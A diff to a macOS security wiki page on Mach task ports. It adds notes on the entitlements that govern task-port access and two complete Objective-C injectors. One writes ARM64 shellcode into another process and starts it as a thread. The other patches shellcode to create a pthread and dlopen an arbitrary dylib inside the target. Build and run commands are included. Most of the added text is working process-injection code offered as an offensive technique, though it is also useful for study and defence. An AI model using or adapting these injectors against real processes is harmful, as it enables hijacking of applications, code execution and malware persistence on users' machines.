@@ -184,12 +184,520 @@ int main() {
 
 ### Privileged Ports
 
-* **Task port** (aka kernel port)**:** With Send permission over this port it's possible to control the task (read/write memory, create threads...).
-  * Call `mach_task_self()` to **get the name** for this port for the caller task. This port is only **inherited** across **`exec()`**; a new task created with `fork()` gets a new task port (as a special case, a task also gets a new task port after `exec()`ing a suid binary). The only way to spawn a task and get its port is to perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) while doing a `fork()`.
 * **Host port**: If a process has **Send** privilege over this port he can get **information** about the **system** (e.g. `host_processor_info`).
 * **Host priv port**: A process with **Send** right over this port can perform **privileged actions** like loading a kernel extension. The **process need to be root** to get tis permission.
-  * Moreover, in order to call `kext_request` API it's needed to have the entitlement `com.apple.private.kext` which is only given to Apple binaries.
+  * Moreover, in order to call **`kext_request`** API it's needed to have the entitlement **`com.apple.private.kext`** which is only given to Apple binaries.
 * **Task name port:** An unprivileged version of the _task port_. It references the task, but does not allow controlling it. The only thing that seems to be available through it is `task_info()`.
+* **Task port** (aka kernel port)**:** With Send permission over this port it's possible to control the task (read/write memory, create threads...).
+  * Call `mach_task_self()` to **get the name** for this port for the caller task. This port is only **inherited** across **`exec()`**; a new task created with `fork()` gets a new task port (as a special case, a task also gets a new task port after `exec()`ing a suid binary). The only way to spawn a task and get its port is to perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) while doing a `fork()`.
+  * These are the restrictions to access the port (from `macos_task_policy` from the binary `AppleMobileFileIntegrity`):
+    * If the app has **`com.apple.security.get-task-allow` entitlement** processes from the **same user can access the task port** (commonly added by Xcode for debugging). The **notarization** process won't allow it to production releases.
+    * Apps the **`com.apple.system-task-ports`** entitlement can get the **task port for any** process, except the kernel. In older versions it was called **`task_for_pid-allow`**. This is only granted to Apple applications.
+    * **Root can access task ports** of applications **not** compiled with a **hardened** runtime (and not from Apple).
+
+### Shellcode Process Injection via Task port
+
+You can grab a shellcode from:
+
+{% content-ref url="../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
+[arm64-basic-assembly.md](../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
+{% endcontent-ref %}
+
+{% tabs %}
+{% tab title="mysleep.m" %}
+```objectivec
+// clang -framework Foundation mysleep.m -o mysleep
+// codesign --entitlements entitlements.plist -s - mysleep
+#import <Foundation/Foundation.h>
+
+int main(int argc, const char * argv[]) {
+    @autoreleasepool {
+        NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
+        [NSThread sleepForTimeInterval:99999];
+    }
+    return 0;
+}
+```
+{% endtab %}
+
+{% tab title="entitlements.plist" %}
+```xml
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>com.apple.security.get-task-allow</key>
+    <true/>
+</dict>
+</plist>
+```
+{% endtab %}
+{% endtabs %}
+
+**Compile** the previous program and add the **entitlements** to be able to inject code with the same user (if not you will need to use **sudo**).
+
+<details>
+
+<summary>injector.m</summary>
+
+```objectivec
+// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
+
+#import <Foundation/Foundation.h>
+#import <AppKit/AppKit.h>
+#include <mach/mach_vm.h>
+#include <sys/sysctl.h>
+
+
+#ifdef __arm64__
+
+kern_return_t mach_vm_allocate
+(
+        vm_map_t target,
+        mach_vm_address_t *address,
+        mach_vm_size_t size,
+        int flags
+);
+
+kern_return_t mach_vm_write
+(
+        vm_map_t target_task,
+        mach_vm_address_t address,
+        vm_offset_t data,
+        mach_msg_type_number_t dataCnt
+);
+
+
+#else
+#include <mach/mach_vm.h>
+#endif
+
+
+#define STACK_SIZE 65536
+#define CODE_SIZE 128
+
+// ARM64 shellcode that executes touch /tmp/lalala
+char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";
+
+
+int inject(pid_t pid){
+
+    task_t remoteTask;
+
+    // Get access to the task port of the process we want to inject into
+    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
+    if (kr != KERN_SUCCESS) {
+        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
+        return (-1);
+    }
+    else{
+        printf("Gathered privileges over the task port of process: %d\n", pid);
+    }
+
+    // Allocate memory for the stack
+    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
+    
+    if (kr != KERN_SUCCESS)
+    {
+        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+        return (-2);
+    }
+    else
+    {
+
+        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
+    }
+    
+    // Allocate memory for the code
+    remoteCode64 = (vm_address_t) NULL;
+    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
+
+    if (kr != KERN_SUCCESS)
+    {
+        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
+        return (-2);
+    }
+    
+
+    // Write the shellcode to the allocated memory
+    kr = mach_vm_write(remoteTask,                   // Task port
+	                   remoteCode64,                 // Virtual Address (Destination)
+	                   (vm_address_t) injectedCode,  // Source
+	                    0xa9);                       // Length of the source
+
+
+    if (kr != KERN_SUCCESS)
+    {
+	fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+	return (-3);
+    }
+
+
+    // Set the permissions on the allocated code memory
+    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+
+    if (kr != KERN_SUCCESS)
+    {
+	fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
+	return (-4);
+    }
+
+    // Set the permissions on the allocated stack memory
+    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
+	
+    if (kr != KERN_SUCCESS)
+    {
+	fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
+	return (-4);
+    }
+
+    // Create thread to run shellcode
+    struct arm_unified_thread_state remoteThreadState64;
+    thread_act_t         remoteThread;
+
+    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
+
+    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+        //remoteStack64 -= 8;  // need alignment of 16
+
+    const char* p = (const char*) remoteCode64;
+
+    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+
+    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
+
+    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+
+    if (kr != KERN_SUCCESS) {
+        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
+        return (-3);
+    }
+
+    return (0);
+}
+
+int main(int argc, const char * argv[]) {
+    @autoreleasepool {
+        if (argc < 2) {
+            NSLog(@"Usage: %s <pid>", argv[0]);
+            return 1;
+        }
+
+        pid_t pid = atoi(argv[1]);
+        inject(pid);
+    }
+
+    return 0;
+}
+```
+
+</details>
+
+```bash
+gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
+./inject <pid-of-mysleep>
+```
+
+### Dylib Process Injection via Task port
+
+In macOS **threads** might be manipulated via **Mach** or using **posix `pthread` api**. The thread we generated in the previos injection, was generated using Mach api, so **it's not posix compliant**.
+
+It was possible to **inject a simple shellcode** to execute a command because it **didn't need to work with posix** compliant apis, only with Mach. **More complex injections** would need the **thread** to be also **posix compliant**.
+
+&#x20;Therefore, to **improve the shellcode** it should call **`pthread_create_from_mach_thread`** which will **create a valid pthread**. Then, this new pthread could **call dlopen** to **load our dylib** from the system.
+
+You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):
+
+{% content-ref url="../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
+[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
+{% endcontent-ref %}
+
+<details>
+
+<summary>dylib_injector.m</summary>
+
+```objectivec
+// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
+// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
+#include <dlfcn.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <mach/mach.h>
+#include <mach/error.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <sys/sysctl.h>
+#include <sys/mman.h>
+
+#include <sys/stat.h>
+#include <pthread.h>
+
+
+#ifdef __arm64__
+//#include "mach/arm/thread_status.h"
+
+// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
+// And I say, bullshit.
+kern_return_t mach_vm_allocate
+(
+        vm_map_t target,
+        mach_vm_address_t *address,
+        mach_vm_size_t size,
+        int flags
+);
+
+kern_return_t mach_vm_write
+(
+        vm_map_t target_task,
+        mach_vm_address_t address,
+        vm_offset_t data,
+        mach_msg_type_number_t dataCnt
+);
+
+
+#else
+#include <mach/mach_vm.h>
+#endif
+
+
+#define STACK_SIZE 65536
+#define CODE_SIZE 128
+
+
+char injectedCode[] =
+
+    "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
+
+    // Call pthread_set_self
+
+    "\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
+    "\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
+    "\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
+    "\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the 
+    "\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
+    "\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
+    "\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
+    "\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
+    "\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
+    "\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
+    "\x00\x00\x00\x14" // loop: b loop              ; loop forever
+
+    // Call dlopen with the path to the library
+    "\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
+    "\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
+    "\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
+    "\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
+    "\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()
+    
+    // Call pthread_exit
+    "\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
+    "\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
+    "\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit
+    
+    "PTHRDCRT"  // <-
+    "PTHRDEXT"  // <-
+    "DLOPEN__"  // <- 
+    "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB" 
+    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;
+
+
+
+
+int inject(pid_t pid, const char *lib) {
+
+    task_t remoteTask;
+    struct stat buf;
+
+    // Check if the library exists
+    int rc = stat (lib, &buf);
+
+    if (rc != 0)
+    {
+        fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
+        //return (-9);
+    }
+
+    // Get access to the task port of the process we want to inject into
+    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
+    if (kr != KERN_SUCCESS) {
+        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
+        return (-1);
+    }
+    else{
+        printf("Gathered privileges over the task port of process: %d\n", pid);
+    }
+
+    // Allocate memory for the stack
+    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
+    
+    if (kr != KERN_SUCCESS)
+    {
+        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+        return (-2);
+    }
+    else
+    {
+
+        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
+    }
+    
+    // Allocate memory for the code
+    remoteCode64 = (vm_address_t) NULL;
+    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
+
+    if (kr != KERN_SUCCESS)
+    {
+        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
+        return (-2);
+    }
+
+ 
+    // Patch shellcode
+
+    int i = 0;
+    char *possiblePatchLocation = (injectedCode );
+    for (i = 0 ; i < 0x100; i++)
+    {
+
+        // Patching is crude, but works.
+        //
+        extern void *_pthread_set_self;
+        possiblePatchLocation++;
+
+        
+        uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
+        uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
+        uint64_t addrOfDlopen = (uint64_t) dlopen;
+
+        if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
+        {
+            memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
+            printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
+        }
+
+        if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
+        {
+            memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
+            printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
+        }
+
+        if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
+        {
+            printf ("DLOpen @%llx\n", addrOfDlopen);
+            memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
+        }
+
+        if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
+        {
+            strcpy(possiblePatchLocation, lib );
+        }
+    }
+
+	// Write the shellcode to the allocated memory
+    kr = mach_vm_write(remoteTask,                   // Task port
+	                   remoteCode64,                 // Virtual Address (Destination)
+	                   (vm_address_t) injectedCode,  // Source
+	                    0xa9);                       // Length of the source
+
+
+    if (kr != KERN_SUCCESS)
+    {
+        fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+        return (-3);
+    }
+
+
+    // Set the permissions on the allocated code memory
+    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+
+    if (kr != KERN_SUCCESS)
+    {
+        fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
+        return (-4);
+    }
+
+    // Set the permissions on the allocated stack memory
+    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
+	
+    if (kr != KERN_SUCCESS)
+    {
+        fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
+        return (-4);
+    }
+
+
+    // Create thread to run shellcode
+    struct arm_unified_thread_state remoteThreadState64;
+    thread_act_t         remoteThread;
+
+    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
+
+    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+        //remoteStack64 -= 8;  // need alignment of 16
+
+    const char* p = (const char*) remoteCode64;
+
+    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+
+    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
+
+    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+
+    if (kr != KERN_SUCCESS) {
+        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
+        return (-3);
+    }
+
+    return (0);
+}
+
+
+
+int main(int argc, const char * argv[])
+{
+    if (argc < 3)
+	{
+		fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
+		fprintf (stderr, "   _action_: path to a dylib on disk\n");
+		exit(0);
+	}
+
+    pid_t pid = atoi(argv[1]);
+    const char *action = argv[2];
+    struct stat buf;
+
+    int rc = stat (action, &buf);
+    if (rc == 0) inject(pid,action);
+    else
+    {
+        fprintf(stderr,"Dylib not found\n");
+    }
+
+}
+```
+
+</details>
+
+```bash
+gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
+./inject <pid-of-mysleep> </path/to/lib.dylib>
+```
 
 ## References
 
